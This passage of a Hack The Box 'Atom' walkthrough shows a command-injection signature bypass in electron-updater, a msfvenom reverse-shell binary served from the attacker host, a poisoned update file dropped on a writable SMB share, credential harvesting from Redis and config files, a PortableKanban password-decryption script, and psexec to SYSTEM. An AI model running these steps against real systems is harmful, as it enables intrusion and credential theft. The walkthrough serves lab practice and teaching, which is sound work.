<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «heed_extracted» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ cat ./<span class="se">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
</span></span><span class="line"><span class="cl">provider: generic
</span></span><span class="line"><span class="cl">url: <span class="s1">&#39;http://updates.atom.htb&#39;</span>
</span></span><span class="line"><span class="cl">publisherName:
</span></span><span class="line"><span class="cl">  - HackTheBox
</span></span></code></pre></div><p>And again, it is the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «heed_extracted» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://updates.atom.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span></code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe </code> is currently on testing phase. Other information that I can obtain are:</p>
<ul>
<li>The app is packed with electron-builder</li>
<li>The app has auto-update feature, but before releasing the updated app, the QA team will test it first.</li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210517200229002.png" alt="image-20210517200229002"  /></div>
</p>
<p>According to the image above, the <code>client</code> folder here probably refers to the ones on SMB.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jason">Shell as Jason</h3>
<h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
<p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check on the new version of binary file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">execFile(&#34;powershell.exe&#34;, [&#34;-NoProfile&#34;, &#34;-NonInteractive&#34;, &#34;-InputFormat&#34;, &#34;None&#34;, &#34;-Command&#34;, `Get-AuthenticodeSignature &#39;${tempUpdateFile}&#39; | ConvertTo-Json -Compress`], {
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
<blockquote>
<p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
</blockquote>
<p>The following is an example of malicious update definition that will pop a calculator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">version: 2.0.0
</span></span><span class="line"><span class="cl">path: u&#39;;calc;&#39;pdate.exe
</span></span><span class="line"><span class="cl">sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
</span></span><span class="line"><span class="cl">releaseDate: &#39;2021-01-24T13:44:59.064Z&#39;
</span></span></code></pre></div><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">`Get-AuthenticodeSignature &#39;u&#39;;payload;&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</span></span></code></pre></div><p>Now that if a single quote <code>'</code> is added to <code>path</code>, it becomes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">`Get-AuthenticodeSignature &#39;u&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</span></span></code></pre></div><p>But then, it would breaks the signature verification.  And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p>
<h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote 😅.</p>
<p>First, I&rsquo;ll have to generate a reverse shell binary. This can be done with <code>msfvenom</code>. I&rsquo;ll host this binary using Python web server afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.49 <span class="nv">LPORT</span><span class="o">=</span><span class="m">53</span> -f exe -o i<span class="se">\&#39;</span>amf.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder or badchars specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">7168</span> bytes
</span></span><span class="line"><span class="cl">Saved as: i<span class="err">&#39;</span>amf.exe
</span></span></code></pre></div><p>Next, I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ shasum -a <span class="m">512</span> i<span class="se">\&#39;</span>amf.exe <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> xxd -r -p <span class="p">|</span> base64 <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span>
</span></span><span class="line"><span class="cl">Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span class="o">==</span>
</span></span></code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="m">2.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">http://10.10.14.83/i&#39;amf.exe</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">sha512</span><span class="p">:</span><span class="w"> </span><span class="l">Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">releaseDate</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;2021-01-24T13:44:59.064Z&#39;</span><span class="w">
</span></span></span></code></pre></div><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ smbclient -N //10.10.10.237/Software_Updates -c <span class="s2">&#34;put iamf-update.yml client1/latest.yml&#34;</span>  <span class="o">&amp;&amp;</span> nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">putting file iamf-update.yml as <span class="se">\c</span>lient1<span class="se">\l</span>atest.yml <span class="o">(</span>1.1 kb/s<span class="o">)</span> <span class="o">(</span>average 1.1 kb/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">64352</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">atom<span class="se">\j</span>ason
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
</span></span></code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\j</span>ason<span class="se">\D</span>esktop&gt;type user.txt
</span></span><span class="line"><span class="cl"><span class="nb">type</span> user.txt
</span></span><span class="line"><span class="cl">b77e754354e186f...&lt;SNIP&gt;...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">[+] Checking Credential manager
</span></span><span class="line"><span class="cl">   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
</span></span><span class="line"><span class="cl">    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     Username:              ATOM\jason
</span></span><span class="line"><span class="cl">     Password:               kidvscat_electron_@123
</span></span><span class="line"><span class="cl">     Target:                ATOM\jason
</span></span><span class="line"><span class="cl">     PersistenceType:       Enterprise
</span></span><span class="line"><span class="cl">     LastWriteTime:         3/31/2021 2:53:49 AM
</span></span></code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp. Its config contains an encrypted Redis database password (The clear password revealed in the next section).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
</span></span><span class="line"><span class="cl">type PortableKanban\PortableKanban.cfg
</span></span><span class="line"><span class="cl">{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="redis-revisited">Redis Revisited</h4>
<p>Looking into the Redis installation folder, I find a plain password in <code>redis.windows.conf</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
</span></span><span class="line"><span class="cl">type redis.windows.conf | findstr requirepass
</span></span><span class="line"><span class="cl">requirepass kidvscat_yes_kidvscat
</span></span></code></pre></div><p><code>redis.windows-service.conf</code> also contains the same password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
</span></span><span class="line"><span class="cl">type redis.windows-service.conf | findstr requirepass
</span></span><span class="line"><span class="cl">requirepass kidvscat_yes_kidvscat
</span></span></code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> works on Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ rlwrap nc -nv 10.10.10.237 <span class="m">6379</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>redis<span class="o">)</span> open
</span></span><span class="line"><span class="cl">AUTH jason kidvscat_electron_@123
</span></span><span class="line"><span class="cl">-ERR wrong number of arguments <span class="k">for</span> <span class="s1">&#39;auth&#39;</span> <span class="nb">command</span>
</span></span><span class="line"><span class="cl">AUTH kidvscat_electron_@123
</span></span><span class="line"><span class="cl">-ERR invalid password
</span></span><span class="line"><span class="cl">AUTH kidvscat_yes_kidvscat
</span></span><span class="line"><span class="cl">+OK
</span></span></code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use.</p>
<p>To do that, I&rsquo;ll send <code>INFO</code> command and starting to look for a chunk called <code>Keyspace</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">INFO
</span></span><span class="line"><span class="cl">$1938
</span></span><span class="line"><span class="cl"># Server
</span></span><span class="line"><span class="cl">redis_version:3.0.504
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"># Keyspace
</span></span><span class="line"><span class="cl">db0:keys=4,expires=0,avg_ttl=0
</span></span></code></pre></div><p>There is one database active, which is <code>db0</code> and it contains 4 keys.</p>
<p>I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">SELECT 0
</span></span><span class="line"><span class="cl">+OK
</span></span><span class="line"><span class="cl">KEYS *
</span></span><span class="line"><span class="cl">*4
</span></span><span class="line"><span class="cl">$48
</span></span><span class="line"><span class="cl">pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
</span></span><span class="line"><span class="cl">$11
</span></span><span class="line"><span class="cl">pk:ids:User
</span></span><span class="line"><span class="cl">$20
</span></span><span class="line"><span class="cl">pk:ids:MetaDataClass
</span></span><span class="line"><span class="cl">$57
</span></span><span class="line"><span class="cl">pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
</span></span></code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
</span></span><span class="line"><span class="cl">$207
</span></span><span class="line"><span class="cl">{&#34;Id&#34;:&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;,&#34;Name&#34;:&#34;Administrator&#34;,&#34;Initials&#34;:&#34;&#34;,&#34;Email&#34;:&#34;&#34;,&#34;EncryptedPassword&#34;:&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;,&#34;Role&#34;:&#34;Admin&#34;,&#34;Inactive&#34;:false,&#34;TimeStamp&#34;:637530169606440253}
</span></span></code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
<p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (a modified version of the original exploit).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">from base64 import b64decode
</span></span><span class="line"><span class="cl">import sys
</span></span><span class="line"><span class="cl">import des 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">key</span> <span class="o">=</span> des.DesKey<span class="o">(</span>b<span class="s1">&#39;7ly6UznJ&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">iv</span> <span class="o">=</span> b<span class="s1">&#39;XuVUm5fR&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">try:    
</span></span><span class="line"><span class="cl">	<span class="nv">passwd</span> <span class="o">=</span> b64decode<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">]</span>.encode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
</span></span><span class="line"><span class="cl">except IndexError:
</span></span><span class="line"><span class="cl">	print<span class="o">(</span><span class="s1">&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span class="o">[</span>0<span class="o">])</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">	sys.exit<span class="o">(</span>-1<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">dec_password</span> <span class="o">=</span> key.decrypt<span class="o">(</span>passwd, <span class="nv">initial</span><span class="o">=</span>iv, <span class="nv">padding</span><span class="o">=</span>True<span class="o">)</span>
</span></span><span class="line"><span class="cl">print<span class="o">(</span><span class="s2">&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
</span></span></code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «atom» «10.10.14.83»
</span></span><span class="line"><span class="cl">$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Decrypted Password: kidvscat_admin_@123
</span></span></code></pre></div><h4 id="psexecpy">psexec.py</h4>
<p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ impacket-psexec atom/administrator:<span class="s1">&#39;kidvscat_admin_@123&#39;</span>@10.10.10.237
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.237.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file FCSITnEj.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.237.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service DCLl on 10.10.10.237.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service DCLl.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami <span class="o">&amp;&amp;</span> hostname
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">ATOM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
</span></span><span class="line"><span class="cl">   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.237
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
